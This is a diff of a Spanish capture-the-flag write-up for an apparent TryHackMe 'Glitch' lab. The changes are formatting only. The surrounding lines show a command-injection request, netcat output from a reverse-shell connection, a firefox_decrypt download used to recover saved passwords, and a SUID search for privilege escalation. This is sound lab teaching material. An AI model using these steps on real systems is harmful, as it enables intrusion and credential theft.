@@ -152,8 +152,6 @@ gobuster -w /usr/share/dirb/wordlists/common.txt dir -u http://10.10.24.13 -x ht
 
 ![Wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz_3.png)
 
-
-
 ### 2.5 Burpsuite - 2
 
 - De acuerdo con las rutas encontradas con el escaneo anterior y después de revisar diferentes posibilidades, modificamos el tipo de petición a **post** y nos encontramos con el mensaje: **"message":"there_is_a_glitch_in_the_matrix"**:
@@ -163,7 +161,6 @@ gobuster -w /usr/share/dirb/wordlists/common.txt dir -u http://10.10.24.13 -x ht
 - Con base en la respuesta de la petición anterior se puede inferir que podemos inyectar código, procedemos a lanzar la siguiente petición para corroborar lo anterior: **POST /api/items?cmd=id HTTP/1.1**
 
 ![Burp](/assets/images/thm-writeup-glitch/glitch_burp_post_id.png)
-
 
 ### 3 Exploit
 
@@ -223,7 +220,7 @@ Connection to 10.9.0.68 3333 port [tcp/*] succeeded!
 ...
 ```
 
-### Exploit para descifar las contraseñas
+### 4 Exploit para descifar las contraseñas
 
 - Descargamos el exploit desde la siguiente página <https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py> lo guardamos con el nombre **exp.py**, o ejecutamos con el siguiente comando y marcamos la opción **2** y de está manera obtenemos un usuario y contraseña:
 
@@ -249,11 +246,12 @@ Password: l??????
 v0id@ubuntu:/home/user$ 
 
 ```
+
 ---
 
-### Root
+### 5 Root
 
-- Con el siguiente comando procedemos a escanerar los binarios que pueden ser explotados y **doas** nos permite 
+- Con el siguiente comando procedemos a escanerar los binarios que pueden ser explotados y **doas** nos permite
 
 ```css
 root@ubuntu:~# find / -type f -user root -perm -u=s 2>/dev/null
